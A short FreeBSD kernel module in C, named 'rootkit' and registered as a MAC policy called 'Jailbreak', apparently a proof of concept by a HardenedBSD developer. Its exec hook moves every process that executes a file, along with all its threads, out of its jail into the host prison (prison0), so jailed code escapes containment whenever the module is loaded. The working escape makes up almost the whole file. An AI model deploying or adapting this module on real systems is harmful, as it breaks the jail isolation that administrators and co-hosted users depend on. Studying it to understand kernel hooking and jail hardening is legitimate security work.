/*-
 * Copyright (c) 2017 Shawn Webb <shawn.webb@hardenedbsd.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <sys/param.h>

#include <sys/imgact.h>
#include <sys/jail.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/module.h>
#include <sys/mount.h>
#include <sys/proc.h>
#include <sys/sx.h>
#include <sys/systm.h>

#include <security/mac/mac_policy.h>

static int
rootkit_vnode_check_exec(struct ucred *, struct vnode *,
    struct label *, struct image_params *, struct label *);

static int
rootkit_vnode_check_exec(struct ucred *ucred, struct vnode *vp,
    struct label *vplabel, struct image_params *imgp,
    struct label *execlabel)
{
	struct thread *td;

	/*
	 * This is probably a bit too paranoid. However, I want to
	 * be sure that all threads are forced into prison0 (the
	 * host.)
	 */
	if (ucred->cr_prison != &prison0 ||
	    imgp->proc->p_ucred->cr_prison != &prison0) {
		ucred->cr_prison = &prison0;
		imgp->proc->p_ucred->cr_prison = &prison0;

		FOREACH_THREAD_IN_PROC(imgp->proc, td) {
			td->td_ucred->cr_prison = &prison0;
		}

		if (imgp->newcred != NULL)
			imgp->newcred->cr_prison = &prison0;
	}

	return (0);
}

static void
rootkit_destroy(struct mac_policy_conf *mpc)
{

	return;
}

static void
rootkit_init(struct mac_policy_conf *mpc)
{

	return;
}

static struct mac_policy_ops rootkit_ops = {
	.mpo_destroy		= rootkit_destroy,
	.mpo_init		= rootkit_init,

	.mpo_vnode_check_exec	= rootkit_vnode_check_exec,
};

MAC_POLICY_SET(&rootkit_ops, rootkit, "Jailbreak",
    MPC_LOADTIME_FLAG_UNLOADOK, NULL);
